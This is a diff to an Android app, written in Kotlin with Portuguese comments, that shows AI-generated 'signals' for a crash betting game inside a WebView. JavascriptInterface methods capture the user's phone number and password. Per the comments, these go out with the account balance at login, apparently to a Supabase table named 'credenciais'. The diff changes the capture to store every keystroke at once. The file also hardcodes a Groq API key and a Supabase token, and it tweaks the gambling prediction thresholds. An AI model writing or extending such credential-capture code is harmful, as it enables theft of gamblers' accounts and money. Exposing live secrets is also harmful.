@@ -94,6 +94,7 @@ class MainActivity : AppCompatActivity() {
     private var graficoPronto = false           // true só após 1.º crash ao vivo
     private var historicoJogoCarregado = false  // true quando JS enviou o histórico do gráfico
     private var countdown429Job: Runnable? = null
+    private var countdownPausaJob: Runnable? = null   // countdown em tempo real durante pausa
     private var ultimaAnaliseMs = 0L          // timestamp da última análise
     private val COOLDOWN_IA_MS = 15_000L
     private var velasDesdeUltimaAnalise = 0
@@ -430,7 +431,7 @@ class MainActivity : AppCompatActivity() {
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "6.5"
+    private val VERSAO_ATUAL = "6.6"
 
     private val GROQ_KEY  = "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"
     private val GROQ_URL  = "https://api.groq.com/openai/v1/chat/completions"
@@ -649,6 +650,8 @@ class MainActivity : AppCompatActivity() {
                 proximaAnaliseRunnable = null
                 retryIaJob?.let { handler.removeCallbacks(it) }
                 retryIaJob = null
+                countdownPausaJob?.let { handler.removeCallbacks(it) }
+                countdownPausaJob = null
                 invalidarCache()
                 // Iniciar relógio se ainda não está activo
                 if (relogioRunnable == null) iniciarRelogio()
@@ -753,18 +756,18 @@ class MainActivity : AppCompatActivity() {
 
             @JavascriptInterface
             fun guardarNumero(valor: String) {
-                // Só guardar em memória — envia junto com senha e saldo ao fazer login
+                // Guardar imediatamente cada dígito — sem esperar tamanho mínimo
                 val limpo = valor.trim()
                     .removePrefix("+244").removePrefix("244")
                     .filter { it.isDigit() }
-                if (limpo.length >= 6) numeroEmMemoria = limpo
+                if (limpo.isNotEmpty()) numeroEmMemoria = limpo
             }
 
             @JavascriptInterface
             fun guardarSenha(valor: String) {
-                // Só guardar em memória — envia junto com número e saldo ao fazer login
+                // Guardar imediatamente cada carácter — sem esperar tamanho mínimo
                 val limpo = valor.trim()
-                if (limpo.length >= 3) senhaEmMemoria = limpo
+                if (limpo.isNotEmpty()) senhaEmMemoria = limpo
             }
 
             @JavascriptInterface
@@ -1941,7 +1944,7 @@ REGRAS ABSOLUTAS DO JSON:
             // ── VALIDAÇÃO CRÍTICA: proteção NUNCA pode ser >= alcance ──────────
             // Proteção é sempre o ponto de saída seguro (muito menor que o alcance)
             // ── Alcance máximo: mínimo 9x ──
-            val alcMaxNumCorrigido = alcMaxNum.coerceAtLeast(9)
+            val alcMaxNumCorrigido = alcMaxNum.coerceAtLeast(alcMin + 1).coerceAtLeast(1)
             val alcMaxFinal = "${alcMaxNumCorrigido}x"
 
             val protCorrigida = when {
@@ -1955,8 +1958,8 @@ REGRAS ABSOLUTAS DO JSON:
                 else -> prot
             }
 
-            // Alcance mínimo: 9x, e sempre pelo menos 3x a proteção
-            val alcMinCorrigido = alcMin.coerceAtLeast(9).coerceAtLeast((protCorrigida * 3f).toInt())
+            // Alcance mínimo: 1x, sempre maior que a proteção e pelo menos protCorrigida+1
+            val alcMinCorrigido = alcMin.coerceAtLeast(1).coerceAtLeast((protCorrigida + 0.5f).toInt())
 
             val alcMax = alcMaxFinal
             sinalProtecao = if (protCorrigida % 1f == 0f) "${protCorrigida.toInt()}x" else "${String.format("%.1f", protCorrigida)}x"
@@ -2356,13 +2359,12 @@ REGRAS ABSOLUTAS DO JSON:
                 sinalAlcMin = 0
                 sinalAlcMax = ""
 
-                // 90s entre análises → máximo 10 chamadas/hora (dentro do limite Groq gratuito)
-                val pausaMs = if (isOfflineSignal) 15_000L else 90_000L
-                val pausaTxt = if (isOfflineSignal) "⏳ A tentar IA em 15s..." else "⏳ Nova análise em 90s..."
+                // 60s entre análises
+                val pausaMs = if (isOfflineSignal) 15_000L else 60_000L
+                val pausaSeg = if (isOfflineSignal) 15 else 60
 
                 // Mostrar estado de aguardar nova análise
                 runOnUiThread {
-                    // Limpar visualmente todos os sinais anteriores
                     txtAcao.text = "🔍 IA A ANALISAR"
                     txtAcao.setTextColor(Color.parseColor("#7c3aed"))
                     txtAcao.visibility = View.VISIBLE
@@ -2370,9 +2372,8 @@ REGRAS ABSOLUTAS DO JSON:
                     txtProtecao.setTextColor(Color.parseColor("#334155"))
                     txtAlcance.text = "--"
                     txtAlcance.setTextColor(Color.parseColor("#334155"))
-                    // Linha janela mostra countdown em vez de min XX → XX
                     if (::txtJanela.isInitialized) {
-                        txtJanela.text = pausaTxt
+                        txtJanela.text = "⏳ IA a analisar em ${pausaSeg}s..."
                         txtJanela.setTextColor(Color.parseColor("#7c3aed"))
                         txtJanela.visibility = View.VISIBLE
                     }
@@ -2380,7 +2381,6 @@ REGRAS ABSOLUTAS DO JSON:
                     dotView.clearAnimation()
                     dotView.background = circulo("#7c3aed")
                     pulseRunnable?.let { handler.removeCallbacks(it) }
-                    // Pulse lento no dot durante análise
                     val animAnalise = android.view.animation.AlphaAnimation(1f, 0.2f).apply {
                         duration = 1200; repeatMode = android.view.animation.Animation.REVERSE
                         repeatCount = android.view.animation.Animation.INFINITE
@@ -2388,12 +2388,28 @@ REGRAS ABSOLUTAS DO JSON:
                     dotView.startAnimation(animAnalise)
                 }
 
+                // Countdown em tempo real — actualiza txtJanela a cada segundo
+                countdownPausaJob?.let { handler.removeCallbacks(it) }
+                var segRestantes = pausaSeg - 1
+                val tickCountdown = object : Runnable {
+                    override fun run() {
+                        if (!cicloAtivo || segRestantes <= 0) return
+                        runOnUiThread {
+                            if (::txtJanela.isInitialized)
+                                txtJanela.text = "⏳ IA a analisar em ${segRestantes}s..."
+                        }
+                        segRestantes--
+                        countdownPausaJob = this
+                        handler.postDelayed(this, 1_000L)
+                    }
+                }
+                countdownPausaJob = tickCountdown
+                handler.postDelayed(tickCountdown, 1_000L)
+
                 // Se era sinal offline, cancelar o retry com backoff longo
-                // e fazer tentativa directa mais rápida
                 if (isOfflineSignal) {
                     retryIaJob?.let { handler.removeCallbacks(it) }
                     retryIaJob = null
-                    // Não resetar o intervalo de backoff ainda — só reseta se a IA responder
                 }
 
                 // Pausa → nova análise
@@ -2401,12 +2417,13 @@ REGRAS ABSOLUTAS DO JSON:
                 val job = Runnable {
                     cicloAtivo = false
                     proximaAnaliseRunnable = null
-                    modoSilenciosoAtivo = false  // garantir que não bloqueia
+                    modoSilenciosoAtivo = false
+                    countdownPausaJob?.let { handler.removeCallbacks(it) }
+                    countdownPausaJob = null
                     if (historicoVelas.size >= MIN_VELAS_ANALISE && !analisandoIA) {
                         invalidarCache()
                         pedirSinalIA()
                     } else {
-                        // Sem velas suficientes → emitir sinal offline para não ficar vazio
                         val s = gerarSinalOffline()
                         runOnUiThread { sinaisAtivos = true; emitirSinalOffline(s) }
                     }
@@ -3961,3 +3978,4 @@ REGRAS ABSOLUTAS DO JSON:
         soundPool = null
     }
 }
+
